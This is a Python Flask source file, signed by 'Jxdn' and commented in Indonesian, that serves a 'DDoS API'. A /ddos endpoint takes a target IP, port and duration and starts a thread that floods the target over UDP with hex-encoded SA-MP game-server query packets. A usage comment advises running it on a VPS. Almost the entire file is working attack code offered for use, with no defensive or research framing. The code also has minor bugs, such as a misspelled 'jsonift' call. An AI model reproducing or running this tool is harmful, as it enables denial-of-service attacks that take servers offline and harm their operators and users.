#CodeByJxdn
from flask import Flask, jsonify, request
import socket, struct, codecs, sys, threading, random, time, os, sys

app = Flask(__name__)

methods = ["SAMP"]

@app.route('/')
def index():
    return jsonify({'Api Ddos By Jxdn'})

#DEF TAROK DISINI
def sampdos(ip, port, times):
    Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"), codecs.decode("53414d509538e1a9611e63","hex_codec"), codecs.decode("53414d509538e1a9611e69","hex_codec"),codecs.decode("53414d509538e1a9611e72","hex_codec"), codecs.decode("3830302c37372c363631","hex_codec"), codecs.decode("35312c31352c363636","hex_codec"), codecs.decode("37312c31382c313737","hex_codec"), codecs.decode("081e62da","hex_codec"), codecs.decode("081e77da","hex_codec"), codecs.decode("081e4dda","hex_codec"), codecs.decode("021efd40","hex_codec"), codecs.decode("021efd40","hex_codec"), codecs.decode("35342c38302c3232","hex_codec"), codecs.decode("081e7eda","hex_codec"),]
    times = int(times)
    clock=(lambda:0,time.time)[times>0]
    dur=(1,(clock()+times))[times>0]
    print('\n[LOGS] Attack %s:%s For %s Seconds'%(ip,port,times or 'infinite'))
    sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    msg = Pacotes[random.randrange(0,3)]
    sock.sendto(msg, (ip, int(port)))
    while True:
      if clock() < dur:
        sock.sendto(Pacotes[5], (ip, int(port)))
      else:
        sock.close()
        break
    print("[LOGS] Attack done Method SAMP")

@app.route('/ddos', methods=['GET'])
def ddos():
    method = request.args.get('method')
    ip = request.args.get('ip')
    port = request.args.get('port')
    times = request.args.get('times')
    if method == '':
        return jsonify({'Input Method'})
    elif ip == '':
        return jsonift({'Input Host'})
    elif port == '':
        return jsonify({'Input Port'})
    elif times == '':
        return jsonify({'Input Times'})
    try:
        if int(times) > 60:
          return jsonify({'Times limit 60!'})
        else:
             if method.upper() not in methods:
               return jsonify({'Invalid Method'})
             elif method.upper() == 'SAMP':
                threading.Thread(target=sampdos, args=(ip, port, times)).start()
                return jsonify({'message':{'attack':ip,'port':port,'times':times,'method':method}})
    except Exception as e:
      return jsonify({'message': 'something went wrong', 'problem-err': f'{e.message} {e.args}'})
      
@app.errorhandler(404)
def not_found(e):
    response = jsonify({'status': 404,'error': 'Not Found'})
    response.status_code = 404
    return response

@app.errorhandler(500)
def not_found(e):
    response = jsonify({'status': 500,'error': 'Not Found'})
    response.status_code = 500
    return response
      

### CONTOH PENGGUNAAN ###
# http://localhost:8080/ddos?method=&ip=&port=&times=
#########################
# Saran run di VPS  
                        
if __name__ == "__main__":
    app.run(debug=False,host='0.0.0.0',port=int(os.environ.get('PORT', 8080)))